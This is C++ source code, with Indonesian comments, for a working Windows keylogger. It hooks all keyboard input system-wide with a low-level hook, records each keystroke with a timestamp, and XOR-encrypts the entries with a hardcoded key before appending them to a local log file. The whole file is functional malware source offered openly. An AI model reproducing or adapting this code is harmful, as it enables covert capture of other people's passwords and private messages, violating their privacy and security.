#include <iostream>
#include <fstream>
#include <windows.h>
#include <thread>
#include <mutex>
#include <ctime>
#include <string>

// Mutex untuk melindungi akses ke file log
std::mutex logMutex;

// Kunci untuk enkripsi XOR
const std::string ENCRYPTION_KEY = "simplekey";

// Fungsi untuk mengenkripsi atau mendekripsi teks menggunakan XOR
std::string xorEncryptDecrypt(const std::string& input, const std::string& key) {
    std::string output = input;
    for (size_t i = 0; i < input.size(); ++i) {
        output[i] ^= key[i % key.size()];
    }
    return output;
}

// Fungsi untuk mendapatkan waktu saat ini
std::string getCurrentTime() {
    time_t now = time(0);
    tm* localTime = localtime(&now);
    char buffer[80];
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", localTime);
    return std::string(buffer);
}

// Fungsi untuk menulis log terenkripsi ke file
void writeEncryptedLog(const std::string& text, const std::string& filePath) {
    std::lock_guard<std::mutex> guard(logMutex);
    std::ofstream logFile(filePath, std::ios::app | std::ios::binary); // Mode biner untuk mencegah masalah format
    if (logFile.is_open()) {
        std::string encryptedText = xorEncryptDecrypt("[" + getCurrentTime() + "] " + text + "\n", ENCRYPTION_KEY);
        logFile.write(encryptedText.c_str(), encryptedText.size());
        logFile.close();
    }
}

// Fungsi untuk menangkap tombol yang ditekan
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*)lParam;
        std::string keyText;

        // Menentukan tombol yang ditekan
        switch (key->vkCode) {
        case VK_SPACE: keyText = "SPACE"; break;
        case VK_RETURN: keyText = "ENTER"; break;
        case VK_TAB: keyText = "TAB"; break;
        case VK_BACK: keyText = "BACKSPACE"; break;
        case VK_SHIFT: keyText = "SHIFT"; break;
        case VK_CONTROL: keyText = "CTRL"; break;
        case VK_ESCAPE: keyText = "ESC"; break;
        default:
            char buffer[2];
            if (key->vkCode >= 32 && key->vkCode <= 126) {
                buffer[0] = static_cast<char>(key->vkCode);
                buffer[1] = '\0';
                keyText = buffer;
            } else {
                keyText = "[" + std::to_string(key->vkCode) + "]";
            }
        }

        // Tulis log terenkripsi
        writeEncryptedLog(keyText, "encrypted_keylog.txt");
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Fungsi utama
int main() {
    std::cout << "Keylogger aktif dengan enkripsi... Tekan Ctrl+C untuk berhenti.\n";

    // Pasang hook untuk keyboard
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, 0);
    if (!hook) {
        std::cerr << "Gagal memasang hook keyboard.\n";
        return 1;
    }

    // Loop pesan
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Lepaskan hook saat selesai
    UnhookWindowsHookEx(hook);
    return 0;
}
